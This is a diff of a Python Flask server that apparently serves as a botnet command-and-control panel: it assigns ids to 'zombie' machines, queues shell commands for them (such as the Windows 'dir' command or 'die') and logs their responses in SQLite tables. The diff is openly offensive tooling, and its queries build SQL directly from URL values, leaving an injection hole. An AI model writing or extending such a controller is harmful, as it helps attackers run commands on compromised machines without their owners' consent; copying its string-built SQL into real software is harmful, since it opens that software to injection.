@@ -3,16 +3,27 @@ import sqlite3
 
 app = Flask(__name__)
 
-command = "a return request"
+# command = "a return request"
 database_name = "test2.db"
 newcomer_command = "dir" # a dir command for windows cmd
+
+@app.route("/getId")
+def give_id():
+    """give an id for a newcomer zombie"""
+    global database_name
+    conn = sqlite3.connect(database_name)
+    cur = conn.execute("select id from zombies order by id desc limit(1)")
+    res = cur.fetchall()
+    # cur.fetchall returns a list of tuples (that's what a table is)
+    last_id = 0 if len(res)==0 else int(res[0][0])
+    return str(last_id+1)
 
 @app.route("/reportResult/<zid>/<command>/<response>")
 def main(zid, command, response):
     """this is how i receive responses (from zombies) to previously sent commands."""
     global database_name
     conn = sqlite3.connect(database_name)
-    conn.execute("insert into {}_history values ('{}','{}');".format(zid, command, response))
+    conn.execute("insert into z{} values ('{}','{}');".format(zid, command, response))
     conn.commit()
     return "recorded"
 
@@ -42,7 +53,7 @@ def send_command(zid):
         # for the newcomer_command and revive them if they're interesting.
         sql = "insert into zombies (id, command) values ('{}', '{}')".format(zid, "die")
         conn.execute(sql)
-        sql = "create table {}_history (command, response)".format(zid)
+        sql = "create table z{} (command, response)".format(zid)
         conn.execute(sql)
         conn.commit()
         conn.close()
@@ -66,3 +77,6 @@ def send_command(zid):
         conn.close()
         print("something is wrong in the send_command method.")
         raise Exception()
+
+
+# to do: I discovvered the uuid is different everytime the script starts. fix this it should be constatnt on the same 
